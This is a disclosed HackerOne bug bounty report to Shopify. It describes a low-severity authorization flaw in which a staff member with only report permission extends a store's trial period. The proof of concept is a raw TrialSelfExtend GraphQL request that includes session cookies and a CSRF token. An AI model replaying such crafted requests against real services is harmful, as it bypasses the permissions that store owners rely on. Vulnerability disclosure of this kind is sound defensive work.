# staff can able to extend shopify trial period without admin permission

## Report Details
- **Report ID**: 947728
- **URL**: https://hackerone.com/reports/947728
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-07-30T09:53:49.689Z
- **Disclosed**: 2020-09-15T02:15:16.291Z

## Reporter
- **Username**: risinghunter
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Description: my store 14 days trial subscription remains only for 2 days and I see  Shopify also offers shop admin to extend shop trial period to another 14 days. so, I found an issue in which staff with no permission also able to extend trial period without admin permission

steps to reproduce :
--
1). add staff only "report" permission
{F930056}
2). then added staff isn't able to do any activity related to subscription/plan
{F930054}
3). run following TrialSelfExtend Graphql request through added staff account 
███████

```
POST /admin/internal/web/graphql/core HTTP/1.1
Host: risinghunter.myshopify.com
Connection: close
Content-Length: 218
accept: application/json
X-CSRF-Token: H9hN7Wt7-0Q1PwBhOsOIZMpEcCnp0WZQw8BM
content-type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Shopify-Web-Force-Proxy: 1
Origin: https://risinghunter.myshopify.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7
Cookie: new_admin=1; new_theme_editor_disabled.sig=c0lGzzh0MFBQ5fCQTfz7yqvtriw; new_theme_editor_disabled=1; _abv=0; _master_udr=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaWxpT1dWbU4yWmtOQzFsTVdFMUxUUmlOekV0WWprMVppMW1PV1ExTm1Jd00yRXhZMllHT2daRlJnPT0iLCJleHAiOiIyMDIyLTA3LTI4VDA3OjEwOjAyLjAyOFoiLCJwdXIiOiJjb29raWUuX21hc3Rlcl91ZHIifX0%3D--aaa21a6f8ca759e8780b581506af5e6b544b851d; _secure_admin_session_id_csrf=9b14248b770db62cc190e3e264362b12; _secure_admin_session_id=9b14248b770db62cc190e3e264362b12; koa.sid=vOD0te0oCONZnKFY8VZeCFGM5sWIbwYB; koa.sid.sig=-qd5DD-YfKDTMZz7LHyxOu7MMsE; _orig_referrer=; _shopify_y=be3905ce-c786-4135-a98c-f4c292fed5bf; _y=be3905ce-c786-4135-a98c-f4c292fed5bf; _landing_page=%2Fadmin%2Fauth%2Flogin%3Faccountnumber%3D0%26from_signup%3Dtrue; __ssid=831ecb8b-307e-4640-af0a-80bfa7b89894; _y=be3905ce-c786-4135-a98c-f4c292fed5bf; _shopify_y=be3905ce-c786-4135-a98c-f4c292fed5bf; _shopify_fs=2020-07-17T04%3A36%3A57.584Z; cart_ver=%3A0; secure_customer_sig=; cart_sig=; new_theme_editor_disabled=1; _ga=GA1.2.1368468577.1594960719; _abv=0; _ab=1; storefront_digest=██████████; _secure_session_id=05214efc7671b79b95c5540b7cde58c2; __cfduid=dd29f3357820fab55e8a97634eec973941595927106

{"operationName":"TrialSelfExtend","variables":{},"query":"mutation TrialSelfExtend {\n  trialSelfExtend {\n    message\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
4). after running above request you get the response "14 days extension added to your trial period"
{F930055}

## Impact

staff can able to extend Shopify trial period without admin permission

## Attachments
- subscription.png
- trial.png
- permission.png
